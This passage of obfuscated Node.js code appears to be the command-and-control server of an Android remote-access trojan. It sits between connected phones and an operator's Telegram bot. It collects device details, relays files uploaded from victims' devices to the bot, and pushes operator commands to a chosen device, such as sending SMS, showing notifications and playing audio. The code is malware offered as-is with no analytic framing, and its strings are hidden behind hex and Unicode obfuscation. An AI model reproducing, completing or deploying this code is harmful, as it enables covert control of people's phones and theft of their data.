"\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE64\uD835\uDE63\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x0A\x0A", "โข แดแดแด๊ฑแด ษช๊ฑ แด ๊ฑสแดสแด แดแด๊ฑ๊ฑแดษขแด แดสแดแด แดแดแดแดแดส๊ฑ แดษด แดสแด แดแดแด ษชแดแด ๊ฑแดสแดแดษด ๊ฐแดส แด ๊ฐแดแดก ๊ฑแดแดแดษดแด๊ฑ", "show_notification", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE56\uD835\uDE68\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x0A\x0A", "โข สแดแดส แดแด๊ฑ๊ฑแดษขแด แดกษชสส สแด แดแดแดแดแดส ษชษด แดแดสษขแดแด แดแดแด ษชแดแด ๊ฑแดแดแดแด๊ฑ สแดส สษชแดแด สแดษขแดสแดส ษดแดแดษช๊ฐษชแดแดแดษชแดษด", "play_audio", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E\x0A\x0A", "โข ษดแดแดแด แดสแดแด สแดแด แดแด๊ฑแด แดษดแดแดส แดสแด แดษชสแดแดแด สษชษดแด แด๊ฐ แดสแด แดแด๊ฑษชสแดแด ๊ฑแดแดษดแด, แดแดสแดสแดกษช๊ฑแด แดสแด ๊ฑแดแดษดแด แดกษชสส ษดแดแด สแด แดสแดสแดแด", "ping", "then", "PORT", "env", "listen"];
const app = express();
const appServer = http[_0xdc21[0]](app);
const appSocket = new webSocket.Server({
    server: appServer
});
const appBot = new telegramBot(token, {
    polling: true
});
const appClients = new Map();
const upload = multer();
app[_0xdc21[2]](bodyParser[_0xdc21[1]]());
let currentUuid = _0xdc21[3];
let currentNumber = _0xdc21[3];
let currentTitle = _0xdc21[3];
app[_0xdc21[7]](_0xdc21[4], function(_0xeb57xa, _0xeb57xb) {
    _0xeb57xb[_0xdc21[6]](_0xdc21[5])
});
app[_0xdc21[20]](_0xdc21[8], upload[_0xdc21[10]](_0xdc21[9]), (_0xeb57xa, _0xeb57xb) => {
    const _0xeb57xc = _0xeb57xa[_0xdc21[9]][_0xdc21[11]];
    appBot[_0xdc21[19]](id, _0xeb57xa[_0xdc21[9]][_0xdc21[12]], {
        caption: `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`,
        parse_mode: _0xdc21[17]
    }, {
        filename: _0xeb57xc,
        contentType: _0xdc21[18]
    });
    _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[21], (_0xeb57xa, _0xeb57xb) => {
    appBot[_0xdc21[25]](id, `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[22]}` + _0xeb57xa[_0xdc21[24]][_0xdc21[23]], {
        parse_mode: _0xdc21[17]
    });
    _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[26], (_0xeb57xa, _0xeb57xb) => {
    appBot[_0xdc21[29]](id, _0xeb57xa[_0xdc21[24]][_0xdc21[27]], _0xeb57xa[_0xdc21[24]][_0xdc21[28]]);
    appBot[_0xdc21[25]](id, `${_0xdc21[30]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`, {
        parse_mode: _0xdc21[17]
    });
    _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
appSocket[_0xdc21[50]](_0xdc21[31], (_0xeb57xd, _0xeb57xa) => {
    const _0xeb57xe = uuid4[_0xdc21[32]]();
    const _0xeb57xf = _0xeb57xa[_0xdc21[15]][_0xdc21[14]];
    const _0xeb57x10 = _0xeb57xa[_0xdc21[15]][_0xdc21[33]];
    const _0xeb57x11 = _0xeb57xa[_0xdc21[15]][_0xdc21[34]];
    const _0xeb57x12 = _0xeb57xa[_0xdc21[15]][_0xdc21[35]];
    const _0xeb57x13 = _0xeb57xa[_0xdc21[15]][_0xdc21[36]];
    _0xeb57xd[_0xdc21[37]] = _0xeb57xe;
    appClients[_0xdc21[38]](_0xeb57xe, {
        model: _0xeb57xf,
        battery: _0xeb57x10,
        version: _0xeb57x11,
        brightness: _0xeb57x12,
        provider: _0xeb57x13
    });
    appBot[_0xdc21[25]](id, `${_0xdc21[39]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
        parse_mode: _0xdc21[17]
    });
    _0xeb57xd[_0xdc21[50]](_0xdc21[47], function() {
        appBot[_0xdc21[25]](id, `${_0xdc21[48]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
            parse_mode: _0xdc21[17]
        });
        appClients[_0xdc21[49]](_0xeb57xd[_0xdc21[37]])
    })
});
appBot[_0xdc21[50]](_0xdc21[51], (_0xeb57x14) => {
    const _0xeb57x15 = _0xeb57x14[_0xdc21[53]][_0xdc21[52]];
    if (_0xeb57x14[_0xdc21[54]]) {
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[55])) {
            currentNumber = _0xeb57x14[_0xdc21[23]];
            appBot[_0xdc21[25]](id, _0xdc21[57] + _0xdc21[58], {
                reply_markup: {
                    force_reply: true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[59])) {
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[60]}${currentNumber}${_0xdc21[4]}${_0xeb57x14[_0xdc21[23]]}${_0xdc21[3]}`)
                }
            });
            currentNumber = _0xdc21[3];
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[67])) {
            const _0xeb57x17 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[68]}${_0xeb57x17}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[69])) {
            const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[70]}${_0xeb57x18}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[71])) {
            const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[72]}${_0xeb57x18}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[73])) {
            const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[74]}${_0xeb57x19}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[75])) {
            const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[76]}${_0xeb57x19}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[77])) {
            const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[78]}${_0xeb57x19}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[79])) {
            const _0xeb57x1a = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[80]}${_0xeb57x1a}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[81])) {
            const _0xeb57x1b = _0xeb57x14[_0xdc21[23]];
            currentTitle = _0xeb57x1b;
            appBot[_0xdc21[25]](id, _0xdc21[82] + _0xdc21[83], {
                reply_markup: {
                    force_reply: true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[84])) {
            const _0xeb57x1c = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[85]}${currentTitle}${_0xdc21[4]}${_0xeb57x1c}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[86])) {
            const _0xeb57x1d = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[87]}${_0xeb57x1d}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        }
    };
    if (id == _0xeb57x15) {
        if (_0xeb57x14[_0xdc21[23]] == _0xdc21[88]) {
            appBot[_0xdc21[25]](id, _0xdc21[89] + _0xdc21[90] + _0xdc21[91] + _0xdc21[92] + _0xdc21[93], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[23]] == _0xdc21[65]) {
            if (appClients[_0xdc21[94]] == 0) {
                appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
            } else {
                let _0xeb57x1e = _0xdc21[97];
                appClients[_0xdc21[61]](function(_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
                    _0xeb57x1e += `${_0xdc21[40]}${_0xeb57x1f[_0xdc21[14]]}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x1f[_0xdc21[33]]}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x1f[_0xdc21[34]]}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x1f[_0xdc21[35]]}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x1f[_0xdc21[36]]}${_0xdc21[98]}`
                });
                appBot[_0xdc21[25]](id, _0xeb57x1e, {
                    parse_mode: _0xdc21[17]
                })
            }
        };
        if (_0xeb57x14[_0xdc21[23]] == _0xdc21[66]) {
            if (appClients[_0xdc21[94]] == 0) {
                appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
            } else {
                const _0xeb57x22 = [];
                appClients[_0xdc21[61]](function(_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
                    _0xeb57x22[_0xdc21[100]]([{
                        text: _0xeb57x1f[_0xdc21[14]],
                        callback_data: _0xdc21[99] + _0xeb57x20
                    }])
                });
                appBot[_0xdc21[25]](id, _0xdc21[101], {
                    "reply_markup": {
                        "inline_keyboard": _0xeb57x22
                    }
                })
            }
        }
    } else {
        appBot[_0xdc21[25]](id, _0xdc21[102])
    }
});
appBot[_0xdc21[50]](_0xdc21[103], (_0xeb57x23) => {
    const _0xeb57x24 = _0xeb57x23[_0xdc21[51]];
    const _0xeb57x25 = _0xeb57x23[_0xdc21[104]];
    const _0xeb57x26 = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[0];
    const _0xeb57xe = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[1];
    console[_0xdc21[107]](_0xeb57xe);
    if (_0xeb57x26 == _0xdc21[108]) {
        appBot[_0xdc21[141]](`${_0xdc21[109]}${appClients[_0xdc21[7]](_0xeb57x25[_0xdc21[106]](_0xdc21[105])[1])[_0xdc21[14]]}${_0xdc21[46]}`, {
            width: 10000,
            chat_id: id,
            message_id: _0xeb57x24[_0xdc21[110]],
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: _0xdc21[111],
                        callback_data: `${_0xdc21[112]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[113],
                        callback_data: `${_0xdc21[114]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[115],
                        callback_data: `${_0xdc21[70]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[116],
                        callback_data: `${_0xdc21[72]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[117],
                        callback_data: `${_0xdc21[118]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[119],
                        callback_data: `${_0xdc21[74]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[120],
                        callback_data: `${_0xdc21[121]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[122],
                        callback_data: `${_0xdc21[123]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[124],
                        callback_data: `${_0xdc21[125]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[126],
                        callback_data: `${_0xdc21[80]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[127],
                        callback_data: `${_0xdc21[128]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[129],
                        callback_data: `${_0xdc21[130]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[131],
                        callback_data: `${_0xdc21[132]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[133],
                        callback_data: `${_0xdc21[85]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[134],
                        callback_data: `${_0xdc21[135]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[136],
                        callback_data: `${_0xdc21[60]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[137],
                        callback_data: `${_0xdc21[87]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[138],
                        callback_data: `${_0xdc21[139]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[140],
                        callback_data: `${_0xdc21[68]}${_0xeb57xe}${_0xdc21[3]}`
                    }]
                ]
            },
            parse_mode: _0xdc21[17]
        })
    };
    if (_0xeb57x26 == _0xdc21[142]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[142])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[144]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[144])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[145]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[145])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[146]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[146])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[147]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[147])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[148]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[148])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[149]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[149])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[150]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[150])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[151]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[151])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[152]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[152])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[153]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[153])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[154]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[155] + _0xdc21[156], {
            reply_markup: {
                force_reply: true
            }
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[157]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[158] + _0xdc21[58], {
            reply_markup: {
                force_reply: true
            }
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[9]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[159] + _0xdc21[160], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[161]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[162] + _0xdc21[163], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[164]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[165] + _0xdc21[166], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[167]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[168] + _0xdc21[169], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[170]) {
